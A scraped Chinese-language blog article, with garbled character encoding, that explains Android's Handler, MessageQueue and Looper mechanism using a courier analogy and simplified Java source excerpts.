content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·7458900207954"/> <meta itemprop="url" content="https://juejin.cn/user/2788814857713687"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Handleræœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788814857713687/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·7458900207954
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:54:56.000Z" title="Thu Jan 08 2026 03:54:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Handleræœºåˆ¶çš„æ ¸å¿ƒä»·å€¼ä¸è®¾è®¡èƒŒæ™¯</h2>
<p>åœ¨Androidä¸­ï¼Œ<strong>åªèƒ½åœ¨ä¸»çº¿ç¨‹(UIçº¿ç¨‹)ä¸­æ›´æ–°UI</strong>ï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯UIæ“ä½œçš„çº¿ç¨‹å®‰å…¨æ€§ã€‚</p>
<p>å¸¸è§çš„æƒ…å†µæ˜¯ï¼š</p>
<ul>
<li>ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ã€æ•°æ®åº“æ“ä½œç­‰è€—æ—¶ä»»åŠ¡å¿…é¡»åœ¨å­çº¿ç¨‹æ‰§è¡Œ</li>
<li>è¿™äº›ä»»åŠ¡å®Œæˆåéœ€è¦å°†ç»“æœåé¦ˆåˆ°UIçº¿ç¨‹æ›´æ–°ç•Œé¢</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šç›´æ¥åœ¨å­çº¿ç¨‹æ›´æ–°UI</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
    Thread.sleep(<span class="hljs-number">2000</span>);
    <span class="hljs-comment">// âŒ ç›´æ¥æ›´æ–°UIä¼šå¯¼è‡´å´©æºƒæˆ–ä¸å¯é¢„çŸ¥çš„è¡Œä¸º</span>
    textView.setText(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>);
}).start();
</code></pre>
<p>Androidé‡‡ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—(Message Queue)æ¨¡å‹æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸æ˜¯ç®€å•çš„çº¿ç¨‹åŒæ­¥æœºåˆ¶ï¼ˆå¦‚é”ã€ä¿¡å·é‡ï¼‰ã€‚è¿™æ˜¯å› ä¸ºï¼š</p>
<ol>
<li><strong>è§£è€¦ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…</strong>ï¼šå‘é€æ¶ˆæ¯çš„çº¿ç¨‹ä¸éœ€è¦çŸ¥é“æ¥æ”¶çº¿ç¨‹çš„çŠ¶æ€</li>
<li><strong>æ”¯æŒå»¶è¿Ÿå’Œå®šæ—¶æ¶ˆæ¯</strong>ï¼šå¯ä»¥è°ƒåº¦æœªæ¥æŸä¸ªæ—¶é—´ç‚¹æ‰§è¡Œçš„ä»»åŠ¡</li>
<li><strong>æœ‰åºå¤„ç†</strong>ï¼šæ¶ˆæ¯æŒ‰ç…§å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„é¡ºåºå¤„ç†</li>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šæ¶ˆæ¯é˜Ÿåˆ—å†…éƒ¨å®ç°äº†çº¿ç¨‹åŒæ­¥</li>
</ol>
<p>é€šä¿—è§£é‡Šï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">**ä¼ ç»Ÿæ–¹å¼ï¼ˆåŒæ­¥æœºåˆ¶ï¼‰** ï¼šæ²¡æœ‰é©¿ç«™ï¼Œç›´æ¥é€è´§
<span class="hljs-comment">// å°±åƒï¼šå¿«é€’å‘˜ç›´æ¥ä¸Šé—¨ï¼Œä½ å¿…é¡»åœ¨å®¶ç­‰ç€</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TraditionalDelivery</span> {
    void deliverPackage() {
        synchronized(lock) {  <span class="hljs-comment">// å°±åƒæ•²é—¨</span>
            <span class="hljs-keyword">if</span> (homeHasPerson) {  <span class="hljs-comment">// ä½ åœ¨å®¶å—ï¼Ÿ</span>
                receivePackage();  <span class="hljs-comment">// ç­¾æ”¶</span>
            } <span class="hljs-keyword">else</span> {
                wait();  <span class="hljs-comment">// å¿«é€’å‘˜åœ¨é—¨å£ç­‰ç€</span>
            }
        }
    }
}

**æ¶ˆæ¯é˜Ÿåˆ—æ–¹å¼**ï¼šæœ‰é©¿ç«™
<span class="hljs-comment">// Androidçš„æ¶ˆæ¯é˜Ÿåˆ—å°±åƒé©¿ç«™</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageQueueExample</span> {
    <span class="hljs-comment">// å‘é€æ¶ˆæ¯å°±åƒæŠŠå¿«é€’æ”¾é©¿ç«™</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendMessage</span><span class="hljs-params">(msg: <span class="hljs-type">Message</span>)</span></span> {
        messageQueue.enqueueMessage(msg)  <span class="hljs-comment">// æ”¾å…¥é©¿ç«™</span>
        <span class="hljs-comment">// æ”¾å®Œå°±èµ°ï¼Œä¸ç”¨ç­‰æ”¶ä»¶äºº</span>
    }
    
    <span class="hljs-comment">// ä¸»çº¿ç¨‹ï¼ˆæ”¶ä»¶äººï¼‰æœ‰ç©ºæ—¶å»é©¿ç«™å–</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processMessages</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">val</span> msg = messageQueue.nextMessage()  <span class="hljs-comment">// å»é©¿ç«™å–å¿«é€’</span>
            handleMessage(msg)  <span class="hljs-comment">// å¤„ç†/ç­¾æ”¶</span>
        }
    }
}
</code></pre>
<p>Handleræœºåˆ¶ç”±ä¸‰ä¸ªç´§å¯†åä½œçš„ç±»ç»„æˆï¼š</p>

























<table><thead><tr><th>ç»„ä»¶</th><th>è§’è‰²</th><th>ç±»æ¯”</th></tr></thead><tbody><tr><td><strong>Handler</strong></td><td>æ¶ˆæ¯çš„å‘é€è€…ä¸å¤„ç†è€…</td><td>å¿«é€’å‘˜ï¼ˆæ”¶ä»¶å’Œæ´¾ä»¶ï¼‰</td></tr><tr><td><strong>MessageQueue</strong></td><td>æ¶ˆæ¯çš„å­˜å‚¨é˜Ÿåˆ—</td><td>å¿«é€’ä»“åº“ï¼ˆæš‚å­˜åŒ…è£¹ï¼‰</td></tr><tr><td><strong>Looper</strong></td><td>æ¶ˆæ¯çš„å¾ªç¯åˆ†å‘å™¨</td><td>ä»“åº“åˆ†æ‹£å‘˜ï¼ˆä¸æ–­å–ä»¶ï¼‰</td></tr></tbody></table>
<p><strong>é‡è¦åŸåˆ™</strong>ï¼š<strong>ä¸€ä¸ªçº¿ç¨‹åªèƒ½æœ‰ä¸€ä¸ªLooperå’Œä¸€ä¸ªMessageQueueï¼Œä½†å¯ä»¥æœ‰å¤šä¸ªHandlerã€‚</strong></p>
<h2 data-id="heading-1">æ ¸å¿ƒç»„ä»¶</h2>
<h3 data-id="heading-2">MessageQueueï¼šæ¶ˆæ¯é˜Ÿåˆ—</h3>
<p>MessageQueueæ˜¯Handleræœºåˆ¶çš„<strong>å­˜å‚¨æ ¸å¿ƒ</strong>ï¼Œå®ƒå†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªæ¶ˆæ¯é“¾è¡¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// MessageQueueä¸­çš„å…³é”®ç»“æ„</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageQueue</span> {
    <span class="hljs-comment">// æ¶ˆæ¯é˜Ÿåˆ—çš„å¤´éƒ¨ï¼Œé“¾è¡¨ç»“æ„</span>
    <span class="hljs-keyword">private</span> Message mMessages;
    
    <span class="hljs-comment">// æ ‡è®°æ˜¯å¦éœ€è¦é€€å‡ºå¾ªç¯</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> mQuitting;
    
    <span class="hljs-comment">// ç”¨äºçº¿ç¨‹åŒæ­¥çš„é”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">mLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-comment">// ç©ºé—²å¤„ç†å™¨é›†åˆ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayList&lt;IdleHandler&gt; mIdleHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
}
</code></pre>
<p>æ¶ˆæ¯å…¥é˜Ÿï¼šå½“Handlerå‘é€æ¶ˆæ¯æ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨MessageQueueçš„<code>enqueueMessage</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">enqueueMessage</span><span class="hljs-params">(Message msg, <span class="hljs-type">long</span> when)</span> {
    <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
        msg.markInUse();
        msg.when = when;
        
        <span class="hljs-type">Message</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> mMessages;
        <span class="hljs-type">boolean</span> needWake;
        
        <span class="hljs-comment">// æƒ…å†µ1ï¼šé˜Ÿåˆ—ä¸ºç©ºï¼Œæˆ–æ–°æ¶ˆæ¯çš„æ‰§è¡Œæ—¶é—´æœ€æ—©</span>
        <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">null</span> || when == <span class="hljs-number">0</span> || when &lt; p.when) {
            msg.next = p;
            mMessages = msg;
            needWake = mBlocked;  <span class="hljs-comment">// å¦‚æœå½“å‰é˜»å¡ï¼Œéœ€è¦å”¤é†’</span>
        } 
        <span class="hljs-comment">// æƒ…å†µ2ï¼šæ’å…¥åˆ°é“¾è¡¨ä¸­é—´åˆé€‚ä½ç½®</span>
        <span class="hljs-keyword">else</span> {
            needWake = mBlocked &amp;&amp; p.target == <span class="hljs-literal">null</span> &amp;&amp; msg.isAsynchronous();
            Message prev;
            <span class="hljs-keyword">for</span> (;;) {
                prev = p;
                p = p.next;
                <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">null</span> || when &lt; p.when) {
                    <span class="hljs-keyword">break</span>;
                }
                <span class="hljs-keyword">if</span> (needWake &amp;&amp; p.isAsynchronous()) {
                    needWake = <span class="hljs-literal">false</span>;
                }
            }
            msg.next = p;
            prev.next = msg;
        }
        
        <span class="hljs-comment">// å¦‚æœéœ€è¦å”¤é†’ï¼Œåˆ™è°ƒç”¨nativeWake</span>
        <span class="hljs-keyword">if</span> (needWake) {
            nativeWake(mPtr);
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<ul>
<li><strong>æ¶ˆæ¯æŒ‰æ‰§è¡Œæ—¶é—´ï¼ˆwhenï¼‰æ’åº</strong>ï¼šä¸æ˜¯ç®€å•çš„å…ˆè¿›å…ˆå‡ºï¼Œè€Œæ˜¯æŒ‰æ‰§è¡Œæ—¶é—´æ’åº</li>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šé€šè¿‡<code>synchronized</code>ä¿è¯å¤šçº¿ç¨‹å®‰å…¨</li>
<li><strong>å”¤é†’æœºåˆ¶</strong>ï¼šå¦‚æœé˜Ÿåˆ—ä¸ºç©ºæ—¶Looperæ­£åœ¨é˜»å¡ï¼Œæ’å…¥æ–°æ¶ˆæ¯éœ€è¦å”¤é†’å®ƒ</li>
</ul>
<p>æ¶ˆæ¯å‡ºé˜Ÿï¼šLooperé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—æä¾›çš„<code>next()</code>æ–¹æ³•ä»é˜Ÿåˆ—ä¸­è·å–æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs language-java" lang="java">Message <span class="hljs-title function_">next</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-comment">// 1. å¤„ç†ç©ºé—²å¤„ç†å™¨ï¼ˆIdleHandlerï¼‰</span>
        <span class="hljs-keyword">if</span> (pendingIdleHandlerCount &lt; <span class="hljs-number">0</span> &amp;&amp; (mMessages == <span class="hljs-literal">null</span> || now &lt; mMessages.when)) {
            pendingIdleHandlerCount = mIdleHandlers.size();
        }
        <span class="hljs-keyword">if</span> (pendingIdleHandlerCount &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// æ²¡æœ‰ç©ºé—²å¤„ç†å™¨ï¼Œè¿›å…¥é˜»å¡</span>
            mBlocked = <span class="hljs-literal">true</span>;
            <span class="hljs-keyword">continue</span>;
        }
        
        <span class="hljs-comment">// 2. ä»é˜Ÿåˆ—å¤´éƒ¨å–æ¶ˆæ¯</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            <span class="hljs-type">Message</span> <span class="hljs-variable">prevMsg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
            <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> mMessages;
            
            <span class="hljs-comment">// å¤„ç†åŒæ­¥å±éšœ</span>
            <span class="hljs-keyword">if</span> (msg != <span class="hljs-literal">null</span> &amp;&amp; msg.target == <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// æ‰¾åˆ°å¼‚æ­¥æ¶ˆæ¯</span>
                <span class="hljs-keyword">do</span> {
                    prevMsg = msg;
                    msg = msg.next;
                } <span class="hljs-keyword">while</span> (msg != <span class="hljs-literal">null</span> &amp;&amp; !msg.isAsynchronous());
            }
            
            <span class="hljs-keyword">if</span> (msg != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (now &lt; msg.when) {
                    <span class="hljs-comment">// æ¶ˆæ¯è¿˜æ²¡åˆ°æ‰§è¡Œæ—¶é—´ï¼Œè®¡ç®—ç­‰å¾…æ—¶é—´</span>
                    nextPollTimeoutMillis = (<span class="hljs-type">int</span>) Math.min(msg.when - now, Integer.MAX_VALUE);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// æ¶ˆæ¯å¯ä»¥æ‰§è¡Œäº†</span>
                    mBlocked = <span class="hljs-literal">false</span>;
                    <span class="hljs-keyword">if</span> (prevMsg != <span class="hljs-literal">null</span>) {
                        prevMsg.next = msg.next;
                    } <span class="hljs-keyword">else</span> {
                        mMessages = msg.next;
                    }
                    msg.next = <span class="hljs-literal">null</span>;
                    <span class="hljs-keyword">return</span> msg;
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— é™ç­‰å¾…</span>
                nextPollTimeoutMillis = -<span class="hljs-number">1</span>;
            }
        }
        
        <span class="hljs-comment">// 3. æ²¡æœ‰æ¶ˆæ¯ï¼Œè¿›å…¥é˜»å¡çŠ¶æ€ï¼ˆNativeå±‚å®ç°ï¼‰</span>
        nativePollOnce(ptr, nextPollTimeoutMillis);
    }
}
</code></pre>
<ul>
<li><strong>é˜»å¡ä¼˜åŒ–</strong>ï¼šæ²¡æœ‰æ¶ˆæ¯æ—¶ï¼ŒLooperä¼šåœ¨Nativeå±‚é˜»å¡ï¼Œä¸æ¶ˆè€—CPU</li>
<li><strong>æ—¶é—´è°ƒåº¦</strong>ï¼šæ¶ˆæ¯æŒ‰æ‰§è¡Œæ—¶é—´æ’åºï¼Œæœªåˆ°æ—¶é—´çš„æ¶ˆæ¯ä¼šç­‰å¾…</li>
<li><strong>ç©ºé—²å¤„ç†</strong>ï¼šåœ¨ç­‰å¾…æ¶ˆæ¯æ—¶ï¼Œä¼šæ‰§è¡ŒIdleHandler</li>
</ul>
<h3 data-id="heading-3">Looperï¼šæ¶ˆæ¯å¾ªç¯çš„å¼•æ“</h3>
<p>Looperæ˜¯è®©çº¿ç¨‹æ‹¥æœ‰æ¶ˆæ¯å¾ªç¯èƒ½åŠ›çš„<strong>å…³é”®ç»„ä»¶</strong>ã€‚</p>
<p>Looperåˆå§‹åŒ–ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸»çº¿ç¨‹çš„Looperåœ¨ActivityThread.main()ä¸­åˆå§‹åŒ–</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    <span class="hljs-comment">// 1. å‡†å¤‡ä¸»çº¿ç¨‹Looper</span>
    Looper.prepareMainLooper();
    
    <span class="hljs-comment">// 2. åˆ›å»ºActivityThreadå®ä¾‹</span>
    <span class="hljs-type">ActivityThread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActivityThread</span>();
    thread.attach(<span class="hljs-literal">false</span>);
    
    <span class="hljs-comment">// 3. å¼€å§‹æ¶ˆæ¯å¾ªç¯</span>
    Looper.loop();
    
    <span class="hljs-comment">// 4. æ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šæ‰§è¡Œåˆ°è¿™é‡Œ</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Main thread loop unexpectedly exited"</span>);
}
</code></pre>
<p>æ™®é€šçº¿ç¨‹åˆ›å»ºLooperï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkerThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> {
    <span class="hljs-keyword">public</span> Handler handler;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å‡†å¤‡Looperï¼ˆåˆ›å»ºLooperå’ŒMessageQueueï¼‰</span>
        Looper.prepare();
        
        <span class="hljs-comment">// 2. åˆ›å»ºHandlerï¼Œä¼šè‡ªåŠ¨ç»‘å®šå½“å‰çº¿ç¨‹çš„Looper</span>
        handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
                <span class="hljs-comment">// å¤„ç†æ¶ˆæ¯</span>
            }
        };
        
        <span class="hljs-comment">// 3. å¼€å§‹æ¶ˆæ¯å¾ªç¯</span>
        Looper.loop();
    }
    
    <span class="hljs-comment">// 4. å®‰å…¨é€€å‡ºå¾ªç¯</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quit</span><span class="hljs-params">()</span> { 
        <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) { 
            handler.getLooper().quit();
        } 
    }
}
</code></pre>
<p>æ¯ä¸ªçº¿ç¨‹åªèƒ½æœ‰ä¸€ä¸ªLooperï¼Œè¿™æ˜¯é€šè¿‡<code>ThreadLocal</code>å®ç°çš„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Looper</span> {
    <span class="hljs-comment">// ThreadLocalå­˜å‚¨æ¯ä¸ªçº¿ç¨‹çš„Looperå®ä¾‹</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;Looper&gt; sThreadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();
    
    <span class="hljs-comment">// å‡†å¤‡Looper</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">prepare</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²ç»å‡†å¤‡è¿‡</span>
        <span class="hljs-keyword">if</span> (sThreadLocal.get() != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ä¸€ä¸ªçº¿ç¨‹åªèƒ½åˆ›å»ºä¸€ä¸ªLooper"</span>);
        }
        <span class="hljs-comment">// åˆ›å»ºLooperå¹¶å­˜å…¥ThreadLocal</span>
        sThreadLocal.set(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Looper</span>());
    }
    
    <span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹çš„Looper</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-meta">@Nullable</span> Looper <span class="hljs-title function_">myLooper</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sThreadLocal.get();
    }
}
</code></pre>
<ul>
<li>æ¯ä¸ªThreadå¯¹è±¡å†…éƒ¨æœ‰ä¸€ä¸ª<code>ThreadLocalMap</code></li>
<li><code>ThreadLocal</code>ä½œä¸ºkeyï¼ŒLooperä½œä¸ºvalueå­˜å‚¨</li>
<li>è¿™æ ·æ¯ä¸ªçº¿ç¨‹éƒ½èƒ½ç‹¬ç«‹è®¿é—®è‡ªå·±çš„Looperï¼Œäº’ä¸å¹²æ‰°</li>
</ul>
<p>Looper.loop()æ˜¯Handleræœºåˆ¶çš„å¿ƒè„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. è·å–å½“å‰çº¿ç¨‹çš„Looper</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Looper</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> myLooper();
    <span class="hljs-keyword">if</span> (me == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"No Looper; Looper.prepare() wasn't called on this thread."</span>);
    }
    
    <span class="hljs-comment">// 2. è·å–æ¶ˆæ¯é˜Ÿåˆ—</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">MessageQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> me.mQueue;
    
    <span class="hljs-comment">// 3. å¼€å§‹æ— é™å¾ªç¯</span>
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-comment">// 4. è·å–ä¸‹ä¸€æ¡æ¶ˆæ¯ï¼ˆå¯èƒ½ä¼šé˜»å¡ï¼‰</span>
        <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> queue.next();
        <span class="hljs-keyword">if</span> (msg == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// æ²¡æœ‰æ¶ˆæ¯ï¼Œé€€å‡ºå¾ªç¯</span>
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 5. åˆ†å‘æ¶ˆæ¯ç»™Handlerå¤„ç†</span>
        <span class="hljs-keyword">try</span> {
            msg.target.dispatchMessage(msg);
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// ç¡®ä¿æ¶ˆæ¯å›æ”¶</span>
            msg.recycleUnchecked();
        }
    }
}
</code></pre>
